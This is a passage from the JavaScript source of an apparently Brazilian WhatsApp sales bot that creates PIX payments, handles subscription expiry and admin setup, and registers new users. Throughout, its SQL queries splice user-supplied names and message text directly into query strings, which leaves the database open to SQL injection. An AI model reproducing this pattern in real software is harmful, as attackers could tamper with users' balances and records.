'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
            }

            TOTAL_SEMANAS = msg[1]

            TOKEN_MP = await TokenLaraRimuru()
            TITULO_PRODUTO = `BotVendas_${Nome_Dono}`
            VALOR_SEMANA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VALOR_SEMANA'`).get()["VALOR"]
            VALOR_SEMANA = parseInt(VALOR_SEMANA) * parseInt(TOTAL_SEMANAS)

            // TAXA_ADESAO_STATUS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TAXA_ADESAO_STATUS'`).get()["VALOR"]
            // if (TAXA_ADESAO_STATUS === "0") {
            //     TAXA_ADESAO_VALOR = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TAXA_ADESAO_VALOR'`).get()["VALOR"]
            //     VALOR_SEMANA = parseInt(TAXA_ADESAO_VALOR) + parseInt(VALOR_SEMANA)
            //     await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'TAXA_ADESAO_STATUS'`).run()
            // }

            var options = {
                mode: 'text', args: [TOKEN_MP, VALOR_SEMANA, TITULO_PRODUTO]
            };
            PythonShell.run('CriarPIXMP2.py', options, async function (error, Resultado) {
                if (error) {
                    console.log(error)
                    Texto = `Erro ao gerar chave pix!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
                };

                try {
                    console.log(Resultado)
                    Div = (Resultado).toString().split("|")
                    iD_Pagamento = Div[0]
                    Link_Copia_Cola_Pix = Div[1]

                    await DataBase_Better.prepare(`INSERT INTO PAGAMENTO_BOT_PIX 
(
ID_PAGAMENTO,
SEMANAS,
VALOR,
CHAVE_PIX_COP_COL,
DATA_ANTERIOR,
DATA_NOVA,
PROCESSADO,
DATA_INSERIDO_MS)
VALUES
(
'${iD_Pagamento}',
'${TOTAL_SEMANAS}',
'${VALOR_SEMANA}',
'${Link_Copia_Cola_Pix}',
'0',
'0',
'0',
'${Date.now()}'
)`).run()

                    Texto = `✨ *PAGAR PARA EXTENDER*

━━━━━━━━❪❃❫━━━━━━━━

- *ID Pagamento:* ${iD_Pagamento}

💰 *Valor:* R$: ${VALOR_SEMANA}

━━━━━━━━❪❃❫━━━━━━━━

🔑 *O CÓDIGO PIX COPIA-E-COLA FOI ENVIADO EM UMA MENSAGEM SEPARADA (ESSA MESMO ABAIXO) PARA FACILITAR NA HORA DE COPIAR O CÓDIGO PARA EFETUAR O PAGAMENTO.*
`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Link_Copia_Cola_Pix}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))

                } catch (error) {
                }
            })
            return;
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        DATA_VENCIMENTO_MS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).get()["VALOR"]
        if (Date.now() > parseInt(DATA_VENCIMENTO_MS)) {
            if (Donos_Supremos.includes(Numero)) {

                Texto = `*⚠️ Bot Vencido...*

*Extender Data de expiração do Bot!*

*Comando:*
/extender===[DIAS]

*Exemplo:*
/extender===7

─────────

*Definir valor semanal do bot!*

*Comando:*
/valorsemana===[VALOR]

*Exemplo:*
/valorsemana===100
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            } else {

                if (Adms.includes(Numero)) {
                    Texto = `⚠️ *DATA DE VENCIMENTO EXPIRADA!*

Escolha quantas semanas deseja pagar para extender!

/botpixsemana===[NÚMERO DE SEMANAS]

Exemplo:

/botpixsemana===2
(Vai gerar um Pix no valor equivalente a duas semanas!)


*SUPORTE*
wa.me/${Numero_Suporte_Plan}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                } else {
                    Texto = `⚠️ *O BOT SE ENCONTRA EM MANUTENÇÃO... VOLTE MAIS TARDE!* ⚠️`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

        NOME_BOT = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'NOME_BOT'`).get()["VALOR"]
        if (NOME_BOT === "0" && Mensagem_Texto.indexOf("/nomebot===") === -1 && Mensagem_Texto.indexOf("/textosuporte===") === -1 && Mensagem_Texto.indexOf("/tokenmp===") === -1) {
            if (Adms.includes(Numero)) {

                Texto = `*VOCÊ AINDA NÃO DEFINIU UM NOME PARA O BOT!*

◎ ══════ ❈ ══════ ◎
*ALTERAR NOME DO BOT*
◎ ══════ ❈ ══════ ◎

/nomebot===[NOME DO BOT]

*EXEMPLO:*
/nomebot===XABLAU STORE
┕━━━━╗✹╔━━━━┙`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `*Bot em manutenção temporária! Estamos decidindo um novo nome para o Bot...*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                try {
                    Texto = `⚠️ *PESSOAS ESTÃO QUERENDO INTERAGIR COM O BOT MAS NÃO VOU DEIXAR ATÉ QUE VOCÊ DEFINA UM NOME PARA ELE!* ⚠️

◎ ══════ ❈ ══════ ◎
*ALTERAR NOME DO BOT*
◎ ══════ ❈ ══════ ◎

/nomebot===[NOME DO BOT]

*EXEMPLO:*
/nomebot===XABLAU STORE
┕━━━━╗✹╔━━━━┙`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                } catch (error) {
                    console.log(error)
                }
                return
            }
        }
        TOKEN_MP = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TOKEN_MP'`).get()["VALOR"]
        if (TOKEN_MP === "0" && Mensagem_Texto.indexOf("/nomebot===") === -1 && Mensagem_Texto.indexOf("/textosuporte===") === -1 && Mensagem_Texto.indexOf("/tokenmp===") === -1) {
            if (Adms.includes(Numero)) {

                Texto = `*VOCÊ AINDA NÃO DEFINIU O TOKEN MERCADO PAGO!*

◎ ══════ ❈ ══════ ◎
*DEFINIR TOKEN MERCADO PAGO*
◎ ══════ ❈ ══════ ◎

/tokenmp===[TOKEN MP]

*EXEMPLO:*
/tokenmp===APP_U.....
┕━━━━╗✹╔━━━━┙`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `*Bot em manutenção temporária! Estamos alterando nosso pix automático....*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                try {
                    Texto = `⚠️ *PESSOAS ESTÃO QUERENDO INTERAGIR COM O BOT MAS NÃO VOU DEIXAR ATÉ QUE VOCÊ DEFINA O TOKEN DO MERCADO PAGO!* ⚠️

◎ ══════ ❈ ══════ ◎
*DEFINIR TOKEN MERCADO PAGO*
◎ ══════ ❈ ══════ ◎

/tokenmp===[TOKEN MP]

*EXEMPLO:*
/tokenmp===APP_U.....
┕━━━━╗✹╔━━━━┙`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                } catch (error) {
                    console.log(error)
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        TEXTO_SUPORTE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_SUPORTE'`).get()["VALOR"]
        if (TEXTO_SUPORTE === "0" && Mensagem_Texto.indexOf("/nomebot===") === -1 && Mensagem_Texto.indexOf("/textosuporte===") === -1 && Mensagem_Texto.indexOf("/tokenmp===") === -1) {
            if (Adms.includes(Numero)) {

                Texto = `*VOCÊ AINDA NÃO DEFINIU OS CONTATOS PARA SUPORTE!*

◎ ══════ ❈ ══════ ◎
*DEFINIR CONTATOS DO SUPORTE*
◎ ══════ ❈ ══════ ◎
(Fique a vontade para escrever um textinho pequeno, contendo os contados dos Suportes.)

*EXEMPLOS*
/textosuporte===Esse aqui é o Suporte principal wa.me/${Numero_Suporte_Plan}

ou

/textosuporte===Qualquer dúvida falem aqui galera wa.me/${Numero_Suporte_Plan} ou esse número tbm wa.me/${Numero_Suporte_Plan}.
┕━━━━╗✹╔━━━━┙`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            } else {
                Texto = `*Bot em manutenção temporária! Estamos trocando o número do suporte...*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                try {
                    Texto = `⚠️ *PESSOAS ESTÃO QUERENDO INTERAGIR COM O BOT MAS NÃO VOU DEIXAR ATÉ QUE VOCÊ DEFINA OS CONTATOS PARA SUPORTE!* ⚠️

◎ ══════ ❈ ══════ ◎
*DEFINIR CONTATOS DO SUPORTE*
◎ ══════ ❈ ══════ ◎
(Fique a vontade para escrever um textinho pequeno, contendo os contados dos Suportes.)

*EXEMPLOS*
/textosuporte===Esse aqui é o Suporte principal wa.me/${Numero_Suporte_Plan}

ou

/textosuporte===Qualquer dúvida falem aqui galera wa.me/${Numero_Suporte_Plan} ou esse número tbm wa.me/${Numero_Suporte_Plan}.
┕━━━━╗✹╔━━━━┙`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                } catch (error) {
                    console.log(error)
                }
                return
            }
        }

        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        Numero_Banco = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()
        if (Numero_Banco === undefined) {
            BONUS_REGISTRO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_REGISTRO'`).get()["VALOR"]
            await DataBase_Better.prepare(`INSERT INTO CONTATOS (ID_CONTATO,SALDO,NOME,DATA_MS_INSERIDO) VALUES ('${Mensagem_From}','${BONUS_REGISTRO}','${Mensagem_Nome}','${Date.now()}') ON CONFLICT DO NOTHING`).run()

            if (BONUS_REGISTRO != "0") {
                Texto_Usuario = `*VOCÊ GANHOU O BÔNUS DE REGISTRO!*

Foi adicionado R$:${BONUS_REGISTRO} ao seu saldo.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }

            NOT_REGISTRO = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_REGISTRO'`).get()["VALOR"]
            if (NOT_REGISTRO === "1") {

                if (BONUS_REGISTRO != "0") {
                    Texto_Grupo = `👤 *NOVO USUÁRIO* 👤 
👤 *INTERAGIU COM O BOT* 👤

*BONÛS DE REGISTRO NO VALOR DE R$:${BONUS_REGISTRO} ADICIONADO AO SALDO DO MESMO!*

👤 NÚMERO DO NOVO USUÁRIO: wa.me/${Numero}

*VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`
                } else {
                    Texto_Grupo = `👤 *NOVO USUÁRIO* 👤 
👤 *INTERAGIU COM O BOT* 👤

👤 NÚMERO DO NOVO USUÁRIO: wa.me/${Numero}

*VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`
                }
                for await (Grupo of ID_GRUPOS) {
                    try {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}',
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Registro_GP}',
'${Date.now()}')`).run()
                    } catch (error) {
                    }
                }

            }

            Texto = `*NOVO USUÁRIO REGISTRADO!*

NOME: ${Mensagem_Nome}

NUMERO: wa.me/${Numero}`
            for await (adm of Adms) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }

            console.log(`Usuário Registrado: ${Mensagem_Nome} | ${Numero}`)

            TIPOMENU_ORDEM = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TIPOMENU_ORDEM'`).get()["VALOR"]
            if (TIPOMENU_ORDEM === "0") {
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = '0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
            } else if (TIPOMENU_ORDEM === "a") {
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 'a' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
            } else if (TIPOMENU_ORDEM === "s") {
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 's' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
            }

            if (Mensagem_Texto.indexOf("BONUS_COD#") > -1) {

            } else {
                await Menu(client, Numero, Mensagem_From)
                return;
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        TIPOMENU_ORDEM = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TIPOMENU_ORDEM'`).get()["VALOR"]
        if (TIPOMENU_ORDEM === "0") {
            await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = '0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        } else if (TIPOMENU_ORDEM === "a") {
            await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 'a' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        } else if (TIPOMENU_ORDEM === "s") {
            await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 's' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        }

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
